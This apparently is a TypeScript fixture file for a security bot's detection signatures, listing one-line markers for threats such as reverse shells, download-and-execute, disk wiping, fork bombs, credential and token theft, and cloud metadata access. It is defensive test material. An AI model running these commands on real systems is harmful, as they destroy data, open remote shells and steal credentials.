// Recall fixtures for the Hanogt Security Bot guard (src/lib/security/signatures.ts).
//
// These are NOT working attacks. Each is a deliberately non-functional, one-line
// token sequence — with placeholders (HOST, PORT, URL, TOKEN, ID) where a real
// payload would need a target — whose only purpose is to confirm the matching
// signature still fires after regex edits. They cannot run or cause harm; they
// exist so a change that accidentally stops detecting a category is caught by
// scripts/eval-security.mjs (a signature with no fixture is reported as a gap).
//
// Fields: id (the signature id it must trigger), marker (the fixture string).

export const RECALL_FIXTURES = [
    { id: "destructive-root-delete", marker: String.raw`rm -rf /` },
    { id: "disk-wipe", marker: String.raw`dd if=/dev/zero of=/dev/sdX` },
    { id: "fork-bomb", marker: String.raw`:(){ :|:& };:` },
    { id: "network-flood", marker: String.raw`hping3 HOST --flood` },
    { id: "reverse-shell", marker: String.raw`bash -i >& /dev/tcp/HOST/PORT` },
    { id: "download-and-execute", marker: String.raw`curl URL | sh` },
    { id: "credential-harvesting", marker: String.raw`.ssh/id_rsa requests.post(URL)` },
    { id: "browser-token-stealer", marker: String.raw`Login Data discord.com/api/webhooks/ID/TOKEN` },
    { id: "shadow-file-access", marker: String.raw`/etc/shadow` },
    { id: "privilege-escalation", marker: String.raw`chmod u+s /bin/sh` },
    { id: "keylogger", marker: String.raw`pynput.keyboard Listener requests.post(URL)` },
    { id: "defense-evasion", marker: String.raw`Set-MpPreference -DisableRealtimeMonitoring $true` },
    { id: "encoded-execution", marker: String.raw`eval(atob(DATA))` },
    { id: "container-control-socket", marker: String.raw`/var/run/docker.sock` },
    { id: "cloud-metadata-credential-access", marker: String.raw`169.254.169.254/latest/meta-data/iam/security-credentials/` },
    { id: "cryptomining-protocol", marker: String.raw`stratum+tcp://HOST:PORT` },
];
